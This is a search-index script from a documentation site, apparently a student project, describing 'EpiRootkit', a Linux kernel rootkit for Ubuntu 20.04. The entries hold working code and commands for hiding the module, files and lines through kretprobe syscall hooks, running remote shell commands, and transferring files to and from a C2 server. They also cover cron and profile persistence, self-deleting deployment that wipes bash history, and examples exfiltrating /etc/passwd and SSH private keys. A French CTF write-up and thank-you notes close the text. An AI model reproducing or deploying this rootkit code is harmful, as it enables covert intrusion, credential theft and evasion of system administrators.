                title: "Configuration Justifications",
                description: "Why Ubuntu 20.04 LTS with kernel 5.4.0-26-generic",
                content: "Target Environment link OS: Ubuntu 20.04 LTS (Focal Fossa) Kernel: 5.4.0-26-generic Why Ubuntu 20.04 LTS? linkPrimary Reason: Ubuntu 20.04 ships with kernel 5.4.0-26-generic pre-compiled and ready to use.\nAdditional Benefits:\nWidespread deployment 5-year LTS support lifecycle (until 31 May 2025â€¦ Iâ€™m so sad) Why Kernel 5.4.0 Specifically? linkKernel 5.4.0 sits in a unique security window that makes rootkit development straightforward:\nThe Security Timeline link 5.3.x â† No lockdown mode 5.4.0 â† Lockdown introduced but disabled by default â† WE ARE HERE 5.7.x â† kallsyms_lookup_name() unexported 5.8.x â† UEFI Secure Boot enables lockdown automatically Result: 5.4.0 provides modern kernel features without the security restrictions that complicate rootkit development.\nTechnical Implementation linkOur kretprobe Approach link static struct kretprobe getdents_probe = { .kp.symbol_name = \"ksys_getdents64\", .handler = hide_files_ret_handler, .maxactive = 20, }; register_kretprobe(\u0026getdents_probe); // Works on 5.4.0 Why this works well on 5.4.0:\nLockdown mode inactive by default kretprobe infrastructure mature and stable ksys_getdents64 symbol readily available No module signature enforcement required What Changes in Newer Kernels? linkKernel 5.7+ Restrictions link // This symbol becomes unexported in 5.7+ kallsyms_lookup_name(\"symbol_name\"); // No longer available Kernel 5.8+ Lockdown link # Automatic lockdown with UEFI Secure Boot cat /sys/kernel/security/lockdown none [integrity] confidentiality # Blocks kretprobe registration register_kretprobe(\u0026probe); // Returns -EPERM Why Not Higher Kernel Versions? linkWhile our implementation is technically compatible with kernel 5.6+, it would require:\n# Boot parameter modification required module.sig_enforce=0 Our Philosophy: We chose Ubuntu 20.04 LTS with kernel 5.4.0 because it provides a practical deployment environment without requiring boot parameter modifications or security bypasses.\ninfo And to be honest I was happy that we could do a rootkit on a LTS version of Ubuntu. So I stick to that. (Even though starting May 2025, Ubuntu 20.04 LTS is no longer supportedâ€¦) "
            }
        );
    index.add(
            {
                id:  29 ,
                href: "\/docs\/05-epirootkit\/overview\/",
                title: "EpiRootkit Overview",
                description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0",
                content: "EpiRootkit linkLinux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).\nFeatures link C2 Communication: TCP connection with domain support and XOR encryption DNS Resolution: Kernel-space domain name resolution Remote Commands: Execute shell commands with output capture File Transfer: Upload/download files between C2 and victim Authentication: SHA-512 password verification with rate limiting XOR Encryption: 32-byte key encryption for all C2 traffic Stealth: Hide module from lsmod and files from directory listings Persistence: Multiple mechanisms to survive reboots Quick Demo link # 1. Build and deploy with XOR encryption enabled cd rootkit \u0026\u0026 make sudo ./deploy_rootkit.sh address=c2.example.com port=443 # 2. Start C2 server cd attacking_program \u0026\u0026 pnpm start # 3. Use rootkit (all communication XOR encrypted) auth Client-1 password # SUCCESS: Authentication successful exec Client-1 whoami # Exit code: 0 # Output: root status Client-1 # EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR Architecture linkCore Components link Network Layer: Connection management and DNS resolution Command System: Authentication and remote execution Stealth Features: Module and file hiding Persistence: Boot survival mechanisms Communication Flow link C2 Server â†â†’ Network/DNS â†â†’ EpiRootkit â†â†’ Linux Kernel (Node.js) (TCP/UDP) (Module) (System Calls) Technical Stack link Target: Ubuntu 20.04 LTS, kernel 5.4.0, x86_64 Language: C (kernel module) + Node.js (C2 server) APIs: ftrace, kretprobe, VFS, UDP sockets Network: TCP (C2) + UDP (DNS resolution) Encryption: XOR cipher with 32-byte hardcoded key Authentication: SHA-512 with rate limiting (5 attempts/60s) Configuration linkEdit rootkit/core/config.h:\n#define C2_SERVER_ADDRESS \"c2.example.com\" // Domain or IP #define C2_SERVER_PORT 4444 #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_MODULE_HIDING 1 // Hide by default #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Documentation link "
            }
        );
    index.add(
            {
                id:  30 ,
                href: "\/docs\/05-epirootkit\/deployment\/",
                title: "Build \u0026 Deployment",
                description: "How to build and load EpiRootkit on Ubuntu 20.04",
                content: "Build \u0026 Deployment linkHow to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.\nRequirements linkSystem link OS: Ubuntu 20.04 LTS Kernel: 5.4.0-* (check with uname -r) Dependencies link sudo apt update sudo apt install -y build-essential linux-headers-$(uname -r) Build link cd rootkit make clean \u0026\u0026 make # âœ“ Build successful: epirootkit.ko created Deployment linkDeployment Script link # Default usage (uses ./epirootkit.ko automatically) sudo ./deploy_rootkit.sh # Custom C2 server sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444 # Domain-based deployment sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com # Stealth deployment with self-cleanup sudo ./deploy_rootkit.sh --self-delete # Verbose deployment (show output) sudo ./deploy_rootkit.sh --verbose Deployment Options link Option Description --verbose Show detailed output during deployment --self-delete Remove script after successful deployment status Check current deployment status uninstall Remove module and cleanup Advanced Usage link # Stealth deployment sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete # Deploy with verbose output then self-destruct sudo ./deploy_rootkit.sh --verbose --self-delete # Check deployment status sudo ./deploy_rootkit.sh status # Status: Active (hidden) # Note: Persistence is managed internally by the rootkit # Remove deployment sudo ./deploy_rootkit.sh uninstall # Module uninstalled Manual Loading (Alternative) link # Load with domain sudo insmod epirootkit.ko address=jules-c2.example.com # Load with IP sudo insmod epirootkit.ko address=192.168.200.11 port=4444 # Load with defaults from config.h sudo insmod epirootkit.ko Self-Cleanup Features linkThe deployment script includes stealth capabilities:\nTrace Cleanup link Temp files: Removes all /tmp/jules_est_bo_* files History cleanup: Removes deployment commands from bash history Stealth backup: Creates and removes backup module files Self-Destruction link # Deploy and vanish completely sudo ./deploy_rootkit.sh --self-delete # Deployment successful # Self-deleting deployment script... # (script file removed automatically) Management linkCheck Status link sudo ./deploy_rootkit.sh status # Status: Active (hidden) # Note: Persistence is managed internally by the rootkit Default Behavior link Module file: Uses ./epirootkit.ko by default if no file specified C2 address: Uses 192.168.200.11:4444 by default Stealth mode: Silent operation by default (use --verbose for output) Persistence: Automatically handled by rootkit internal mechanisms Complete Removal link sudo ./deploy_rootkit.sh uninstall # Module uninstalled # Note: Rootkit persistence may remain - use rootkit's own removal commands Domain Support: The rootkit supports both domain names and IP addresses. For DNS resolution details, see "
            }
        );
    index.add(
            {
                id:  31 ,
                href: "\/docs\/05-epirootkit\/connection-authentication\/",
                title: "Connection \u0026 Authentication",
                description: "How the rootkit connects to C2 server and authenticates",
                content: "Connection \u0026 Authentication linkHow EpiRootkit connects to the C2 server and handles authentication with domain support and XOR encryption.\nConnection Process linkWhen the rootkit loads, it automatically:\nStarts connection thread (epirootkit_conn) Resolves domain (if address is domain name) - see "
            }
        );
    index.add(
            {
                id:  32 ,
                href: "\/docs\/05-epirootkit\/features\/",
                title: "Features",
                description: "EpiRootkit core functionality and capabilities",
                content: "EpiRootkit Features linkCore functionality and capabilities of the EpiRootkit system.\nCore Features link "
            }
        );
    index.add(
            {
                id:  33 ,
                href: "\/docs\/05-epirootkit\/features\/command-execution\/",
                title: "Command Execution",
                description: "Execute shell commands remotely with full output capture",
                content: "Command Execution linkExecute shell commands remotely through the rootkit with full output capture.\nHow It Works link C2 sends command via network Rootkit executes using call_usermodehelper() with /bin/sh -c Captures output by redirecting to temporary file Returns result with exit code and output Implementation link static int handle_exec(const char *data) { char *argv[] = { \"/bin/sh\", \"-c\", command_copy, NULL }; char *envp[] = { \"HOME=/\", \"PATH=/sbin:/bin:/usr/bin\", NULL }; // Generate unique temporary filename snprintf(temp_filename, sizeof(temp_filename), \"/tmp/epirootkit_out_%d\", atomic_inc_return(\u0026exec_counter)); // Execute with output redirection snprintf(full_command, command_len + temp_len + 32, \"%s \u003e %s 2\u003e\u00261\", data, temp_filename); ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); return send_result(formatted_result); } Usage linkWebUI Terminal linkInteractive terminal interface with:\nCommand input and real-time output Command history and exit code indicators C2 Commands link # System information exec Client-1 whoami exec Client-1 uname -a # File operations exec Client-1 ls -la /etc exec Client-1 cat /etc/passwd # Network reconnaissance exec Client-1 netstat -tuln exec Client-1 iptables -L Technical Details link Output capture: Redirects to /tmp/epirootkit_out_X Memory handling: vmalloc() for large outputs (up to 64KB) Cleanup: Automatic temporary file removal "
            }
        );
    index.add(
            {
                id:  34 ,
                href: "\/docs\/05-epirootkit\/features\/file-transfer\/",
                title: "File Transfer",
                description: "Upload and download files between C2 server and victim system",
                content: "File Transfer linkTransfer files between the C2 server and victim system using direct content transmission.\nHow It Works linkUpload: C2 â†’ Victim system\nDownload: Victim system â†’ C2\nImplementation linkUpload Handler link static int handle_upload(const char *data) { char *filename, *file_content, *separator; struct file *file; loff_t pos = 0; // Parse filename:content format separator = strchr(data, ':'); *separator = '\\0'; filename = data; file_content = separator + 1; // Create and write file file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644); kernel_write(file, file_content, content_length, \u0026pos); filp_close(file, NULL); return send_success(\"File uploaded successfully\"); } Download Handler link static int handle_download(const char *data) { struct file *file; loff_t file_size, pos = 0; char *file_content; // Open and read file file = filp_open(data, O_RDONLY, 0); file_size = i_size_read(file_inode(file)); file_content = vmalloc(file_size + 1); kernel_read(file, file_content, file_size, \u0026pos); filp_close(file, NULL); return send_result(file_content); } Usage linkWebUI Interface link Upload Panel: File selection and remote path specification Download Panel: File browser and batch downloads C2 Commands link # Upload files upload Client-1 ./config.txt /etc/myapp/config.txt upload Client-1 ./script.sh /tmp/script.sh # Download files download Client-1 /etc/passwd ./victim_passwd download Client-1 /etc/hostname Examples link # System reconnaissance download Client-1 /etc/passwd download Client-1 /etc/hosts download Client-1 /proc/version # Deploy tools upload Client-1 ./linpeas.sh /tmp/enum.sh exec Client-1 chmod +x /tmp/enum.sh # Exfiltrate data download Client-1 /home/user/.ssh/id_rsa download Client-1 /var/log/auth.log Technical Details link File size limit: 10MB maximum transfer Permissions: Files created with 0644 permissions Error handling: Graceful failure on permission/space issues "
            }
        );
    index.add(
            {
                id:  35 ,
                href: "\/docs\/05-epirootkit\/features\/hiding\/",
                title: "Stealth \u0026 Hiding",
                description: "Module hiding, file hiding and line hiding capabilities",
                content: "Stealth \u0026 Hiding linkThree stealth mechanisms to hide the rootkit from system detection using kernel hooking techniques.\nModule Hiding linkHide the rootkit module from lsmod and /proc/modules by removing it from the kernelâ€™s module list.\nImplementation link int hide_module(void) { if (stealth_state.module_hidden) return 0; stealth_state.prev_module_entry = THIS_MODULE-\u003elist.prev; list_del(\u0026THIS_MODULE-\u003elist); stealth_state.module_hidden = true; return 0; } How it works: Removes module from kernelâ€™s linked list using list_del().\nFile Hiding linkHide files with specific prefixes from directory listings by hooking the getdents64 syscall.\nImplementation link stealth_state.getdents_probe = (struct kretprobe) { .kp.symbol_name = \"ksys_getdents64\", .handler = getdents64_ret_handler, .entry_handler = getdents64_entry_handler, .maxactive = 20 }; How it works: Intercepts directory reads and filters out files matching hidden prefixes.\nLine Hiding linkHide rootkit-related lines from file content when users read system files.\nImplementation link stealth_state.read_probe = (struct kretprobe) { .kp.symbol_name = \"ksys_read\", .handler = read_ret_handler, .entry_handler = read_entry_handler, .maxactive = 20 }; How it works: Hooks ksys_read syscall and filters lines containing rootkit patterns.\nTarget Patterns link static const char * const line_hide_patterns[] = { \"epirootkit\", \"jules_est_bo_\", \"EpiRootkit\", \"modprobe epirootkit\", \"insmod\" }; Target Directories link /etc/cron.d/ /etc/modules-load.d/ /etc/profile.d/ /proc/modules Usage linkWebUI Control link"
            }
        );
    index.add(
            {
                id:  36 ,
                href: "\/docs\/05-epirootkit\/features\/persistence\/",
                title: "Persistence",
                description: "Multiple boot persistence mechanisms for rootkit survival",
                content: "Persistence linkMultiple boot persistence mechanisms to ensure rootkit survival across system reboots.\nThree Mechanisms link1. modules-load.d linkFile: /etc/modules-load.d/jules_est_bo_system.conf\nContent: epirootkit address=X.X.X.X port=YYYY\nTrigger: systemd reads config and loads module automatically on boot\n2. Cron Jobs linkFile: /etc/cron.d/jules_est_bo_update\nSchedule: Every 5 minutes check and load if not present\nStealth: Disguised as system update task with stealth naming\n3. Shell Profiles linkFile: /etc/profile.d/jules_est_bo_env.sh\nTrigger: Executes when root user logs in\nCheck: Loads module if not already present\nImplementation linkAutomatic Installation link int persistence_init(void) { return persistence_install(); // Install all mechanisms } Individual Mechanisms link // modules-load.d persistence int persistence_install_modules_load(void) { return write_file(\"/etc/modules-load.d/jules_est_bo_system.conf\", \"epirootkit address=X.X.X.X port=YYYY\\n\"); } // Cron persistence (every 5 minutes) int persistence_install_cron(void) { const char *cron_content = \"*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then \" \"modprobe epirootkit 2\u003e/dev/null || \" \"insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi'\\n\"; return write_file(\"/etc/cron.d/jules_est_bo_update\", cron_content, 0644); } // Shell profile persistence int persistence_install_shell_profile(void) { const char *profile_content = \"#!/bin/bash\\n\" \"if [ \\\"$(id -u)\\\" -eq 0 ]; then\\n\" \" if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then\\n\" \" modprobe epirootkit 2\u003e/dev/null\\n\" \" fi\\n\" \"fi\\n\"; return write_file(\"/etc/profile.d/jules_est_bo_env.sh\", profile_content, 0755); } Usage linkWebUI Control link"
            }
        );
    index.add(
            {
                id:  37 ,
                href: "\/docs\/05-epirootkit\/features\/dns-resolution\/",
                title: "DNS Resolution",
                description: "Kernel-space domain name resolution for flexible C2 connectivity",
                content: "DNS Resolution linkKernel-space DNS resolver for flexible C2 server connections using domain names.\nHow It Works link Detect address type - IP vs domain name Create UDP socket in kernel space Query 8.8.8.8:53 with A record lookup Parse response and extract IPv4 address Implementation link int kernel_dns_resolve(const char *hostname, u32 *ip_addr) { // Create UDP socket sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, \u0026sock); // Build DNS query packet dns_query = build_dns_query(hostname); // Send to 8.8.8.8:53 kernel_sendmsg(sock, \u0026msg, iov, 1, query_len); // Receive and parse response kernel_recvmsg(sock, \u0026msg, MSG_WAITALL); *ip_addr = parse_dns_response(response_buf); sock_release(sock); return 0; } Usage linkDomain Name Configuration link # Use domain name for C2 server sudo insmod epirootkit.ko address=c2.example.com port=4444 IP Address (bypasses DNS) link # Direct IP connection sudo insmod epirootkit.ko address=192.168.1.100 port=4444 Integration linkAutomatic detection in socket connection:\nif (!in4_pton(config.address, -1, (u8*)\u0026server_addr.sin_addr.s_addr, -1, NULL)) { // Not an IP - resolve domain ret = kernel_dns_resolve(config.address, \u0026target_ip); if (ret \u003c 0) return ret; server_addr.sin_addr.s_addr = target_ip; } Technical Details link Protocol: UDP DNS queries Server: 8.8.8.8:53 (Google DNS) Query type: A records (IPv4) only Buffer size: 256 bytes Fallback: Direct IP if resolution fails "
            }
        );
    index.add(
            {
                id:  38 ,
                href: "\/docs\/05-epirootkit\/features\/encryption\/",
                title: "XOR Encryption",
                description: "XOR encryption for C2 communication",
                content: "XOR Encryption linkXOR encryption for C2 communication with implementation.\nHow It Works link Symmetric operation: Same function for encrypt/decrypt Hardcoded 32-byte key: Identical on server and kernel Binary compatibility: Consistent synchronization Zero dependencies: No crypto API complexities Implementation linkServer Side link // 32-byte hardcoded XOR key const XOR_KEY = Buffer.from('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 'hex'); function xorCrypt(data) { const input = Buffer.isBuffer(data) ? data : Buffer.from(data, 'utf8'); const result = Buffer.alloc(input.length); for (let i = 0; i \u003c input.length; i++) { result[i] = input[i] ^ XOR_KEY[i % XOR_KEY.length]; } return result; } const encryption = { encrypt(text) { return xorCrypt(text); }, decrypt(data) { return xorCrypt(data).toString('utf8'); } }; Kernel Side link // Matching XOR key (32 bytes) static const u8 XOR_KEY[] = { 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef }; static void xor_crypt(const u8 *input, u8 *output, size_t length) { for (size_t i = 0; i \u003c length; i++) { output[i] = input[i] ^ XOR_KEY[i % XOR_KEY_SIZE]; } } Message Flow link Plaintext: \"CMD:auth:password\" â†“ XOR with key Encrypted: [binary data] â†“ TCP transmission Kernel: receives binary â†’ XOR â†’ \"CMD:auth:password\" Configuration linkCompile-time Setting link // rootkit/core/config.h #define ENABLE_ENCRYPTION 1 // 1 = enabled, 0 = disabled Custom Key linkUpdate both locations with matching values:\n// Server: attacking_program/src/utils/encryption.js const XOR_KEY = Buffer.from('your32bytehexkeyhere...', 'hex'); // Kernel: rootkit/security/crypto.c static const u8 XOR_KEY[] = { 0xYO, 0xUR, 0xKE, 0xY... }; "
            }
        );
    index.add(
            {
                id:  39 ,
                href: "\/docs\/05-epirootkit\/features\/line-hiding\/",
                title: "Line Hiding",
                description: "Hide rootkit lines from file contents using syscall interception",
                content: "Line Hiding linkHide lines containing rootkit patterns from file contents by intercepting read syscalls and filtering output in real-time.\nHow It Works link Hook ksys_read using kretprobe Check file path from file descriptor Filter target files line-by-line Remove pattern matches and adjust return size Implementation link line_hiding_state.read_probe = (struct kretprobe) { .kp.symbol_name = \"ksys_read\", .handler = read_ret_handler, .entry_handler = read_entry_handler, .maxactive = 50 }; static int read_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs) { if (should_filter_file(ctx-\u003efilepath)) { copy_from_user(kernel_buffer, ctx-\u003euser_buffer, ret_value); filtered_size = filter_file_lines(kernel_buffer, ret_value); copy_to_user(ctx-\u003euser_buffer, kernel_buffer, filtered_size); regs_set_return_value(regs, filtered_size); } } Target Configuration linkDirectories link /etc/cron.d/ - Cron job definitions /etc/modules-load.d/ - Module loading configs /etc/profile.d/ - Shell profile scripts /proc/modules - Loaded kernel modules Hidden Patterns link static const char * const hide_line_patterns[] = { \"epirootkit\", \"jules_est_bo_\", \"EpiRootkit\", \"modprobe epirootkit\", \"insmod epirootkit\" }; Testing linkTest File link # Use provided test file sudo cp test_line_hiding_epirootkit.txt /etc/cron.d/test_epirootkit # View filtered content cat /etc/cron.d/test_epirootkit Result: 24 lines â†’ ~9 lines (rootkit patterns filtered automatically)\nExample Output link # Normal lines visible * * * * * root /usr/bin/legitimate_cron_job.sh 0 2 * * * root /usr/bin/backup_script.sh 15 3 * * 0 root /usr/bin/weekly_cleanup.sh # Lines with 'epirootkit' patterns are hidden 30 1 * * * root /usr/bin/system_update.sh 45 23 * * * root /usr/bin/cleanup_logs.sh Usage linkWebUI Control link"
            }
        );
    index.add(
            {
                id:  40 ,
                href: "\/docs\/06-bonuses\/wlkom-ctf\/",
                title: "Tux Fan Club: Chasse au TrÃ©sor Pirate",
                description: "Cap'tain RenÃ© Bojolais est un petit cachotier.",
                content: "Treasure Hunt ðŸª™ linkDÃ©couverte dâ€™un mystÃ©rieux fichierâ€¦ linkNous avons dÃ©cidÃ© dâ€™accepter une quÃªte secondaire durant le projet Rootkit.\nEn effet, comme tout bon pirate, nous avons tÃ©lÃ©chargÃ© lÃ©galement les fichiers fournis (given files) et nous souhaitions les ignorer avec un fichier .gitignore.\nLe .gitignore ressemblait Ã  :\n.gitignore givenfiles/ Sauf que les fichiers nâ€™Ã©taient pas ignorÃ©s. (Vu que LÃ©a ne sait pas Ã©crire) Câ€™est lÃ  que nous dÃ©couvrons un mystÃ©rieux fichier .README :\nArborescence rÃ©vÃ©lant le fichier cachÃ©\nTentative de lecture du parchemin linkAprÃ¨s avoir accÃ©dÃ© Ã  ce fichier, nous dÃ©cidons de lâ€™ouvrir. Le dÃ©chiffrer Ã©tait une autre paire de manchesâ€¦\nContenu du fichier mystÃ©rieux\nW3lc0m3 t0 thE 53cR3t p1r4t35 l4ir. Young pirate, you have find my treasure. It is yours. Navigate safely, -- Cap'tain RenÃ© Bojolais Le reste du parchemin Ã©tait du langage codÃ©. GrÃ¢ce Ã  notre expÃ©rience en programmation et en langues, nous comprenons quâ€™il sâ€™agit dâ€™une image encodÃ©e en base64.\nDÃ©chiffrer lâ€™image linkAvec la commande base64 -d .README \u003e image.jpg nous avons pu obtenir lâ€™image (il fallait Ã©videmment garder que la partie en base64 du README).\nImage dÃ©chiffrÃ©e\nVoici la magnifique illustrationâ€¦ Mais nous savons que le capitaine RenÃ© avait plus dâ€™un tour dans son sac. Donc nous dÃ©cidions dâ€™examiner lâ€™image en dÃ©tail.\nChanson cachÃ©e linkEn utilisant le site https://georgeom.net/StegOnline/upload pour extraire les valeurs RGB de lâ€™image et le texte cachÃ©, on remarque une chaÃ®ne de caractÃ¨res insoliteâ€¦\nExtraction de donnÃ©es cachÃ©es\nI am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wavUT\nCela nous rappelle une chanson de pirates bien connueâ€¦\nNotre premiÃ¨re idÃ©e est de chercher le remix sur Youtube afin de voir si le Capitaine RenÃ© nâ€™a pas laissÃ© un petit flag en commentaire. Apparemment, il nâ€™est pas fan dâ€™OSINT, dommage ðŸ˜”\nNotre deuxiÃ¨me idÃ©e est de dÃ©zipper lâ€™image unzip image.jpg et lÃ , bingo !\nArchive: image.jpg warning [image.jpg]: 21054 extra bytes at beginning or within zipfile (attempting to process anyway) inflating: I am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wav Audacity time linkGrÃ¢ce Ã  notre expÃ©rience en CTF, nous avons tout de suite lâ€™idÃ©e dâ€™examiner le spectrogramme.\nRien dâ€™anormal sauf sur les derniÃ¨res secondes du fichier. Et lÃ â€¦ nous trouvons le flag !\nLe trÃ©sor cachÃ© dans le spectrogramme\nIl ne nous reste quâ€™Ã  transmettre le mot de passe au capitaine et Ã  nous le trÃ©sorâ€¦\nTrÃ©sor link Grrr des canards\nConclusion linkUne fois cette chasse au trÃ©sor finie, il est temps de commencer le projet principal ðŸ‘€\n"
            }
        );
    index.add(
            {
                id:  41 ,
                href: "\/docs\/07-remerciements\/thankyou\/",
                title: "Un dernier mot",
                description: "Merci \u003c3",
                content: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl mâ€™a permis dâ€™expÃ©rimenter plein de sujets diffÃ©rents, jâ€™ai profitÃ© de lâ€™excuse de â€œcâ€™est pour le travail dâ€™EPITAâ€ pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont Ã©crits), jâ€™ai pu mettre en pratique directement ce que jâ€™ai pu apprendre dans mon travail, notamment jâ€™avais dÃ» faire une prÃ©sentation sur un rootkit (PUMAKIT) Ã  ma boÃ®te, et jâ€™ai pu mâ€™en inspirer et recrÃ©er le rootkit en amÃ©liorant certaines fonctionnalitÃ©s (car franchement il Ã©tait assez mal foutu, les Chinois nâ€™ont quâ€™Ã  bien se tenir). Jâ€™ai eu lâ€™occasion de discuter avec certains SRS pour avoir des avis sur certaines implÃ©mentations. Spoiler, ils Ã©taient tous jaloux du fait que en premiÃ¨re annÃ©e dâ€™alternance on fait un projet aussi cool alors quâ€™ils se tapent de lâ€™Active Directory depuis 2 mois.\nJâ€™ai mÃªme eu lâ€™idÃ©e de crÃ©er un nouveau club de cyber en parlant Ã  des gens de ma promo aussi trÃ¨s investis par le projet (Paul, Kyllian, Matteoâ€¦).\nMon maÃ®tre dâ€™alternance (ancien SRS promo 2012), Ã©tait trÃ¨s intÃ©ressÃ© par le projet lui aussi et mâ€™a demandÃ© de faire une prÃ©sentation complÃ¨te de mon implÃ©mentation devant toute lâ€™entreprise une fois que ce sera fini.\nEt bien Ã©videmment, ce qui est sÃ»rement le plus important, jâ€™ai pu avoir un magnifique canard en plastique, que jâ€™ai torturÃ© pendant ce PTN DE RUSH DE JS (oui jâ€™ai encore des sÃ©quelles).\nBref merci :)\nCanard-ment,\nâ€“\nHugo Sibony\nAPPING Cyber 2027\nâ€œJâ€™Ã©cris ce message a 10000m dâ€™altitude dans un avion qui tremble plus que moi dans lâ€™attente de ma note de JS.â€\nLÃ©a linkBonjour,\nCâ€™est LÃ©a\nCoin-Coin-ment,\nâ€“ LÃ©a Bonet DÃ©lÃ©guÃ©e APPING Cyb 2027\nâ€œAu moins Hugo ne sâ€™est pas fait arrÃªtÃ© Ã  la sortie de lâ€™avion ðŸ‘€â€\n"
            }
        );
    index.add(
            {
                id:  42 ,
                href: "\/docs\/",
                title: "Docs",
                description: "",
                content: ""
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script></body></html>